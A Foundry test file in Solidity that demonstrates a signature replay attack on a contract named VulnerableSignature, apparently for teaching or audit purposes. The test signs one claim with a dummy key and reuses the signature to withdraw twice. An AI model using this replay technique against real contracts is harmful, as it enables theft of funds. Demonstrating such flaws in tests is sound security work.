// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/VulnerableSignature.sol";

contract VulnerableSignatureTest is Test {
    VulnerableSignature vulnerable;
    uint256 signerPrivateKey = 0xA11CE;
    address signer;
    address alice = makeAddr("alice");

    function setUp() public {
        signer = vm.addr(signerPrivateKey);

        vm.prank(signer);
        vulnerable = new VulnerableSignature();

        vm.deal(address(vulnerable), 10 ether);
    }

    function testSignatureReplayAttack() public {
        uint256 amount = 1 ether;

        bytes32 messageHash = keccak256(
            abi.encodePacked(alice, amount)
        );

        bytes32 ethSignedMessageHash = keccak256(
            abi.encodePacked(
                "\x19Ethereum Signed Message:\n32",
                messageHash
            )
        );

        (uint8 v, bytes32 r, bytes32 s) =
            vm.sign(signerPrivateKey, ethSignedMessageHash);

        bytes memory signature = abi.encodePacked(r, s, v);

        vm.startPrank(alice);

        vulnerable.claim(amount, signature);
        vulnerable.claim(amount, signature);

        vm.stopPrank();

        assertEq(alice.balance, 2 ether);
        assertEq(address(vulnerable).balance, 8 ether);
    }
}
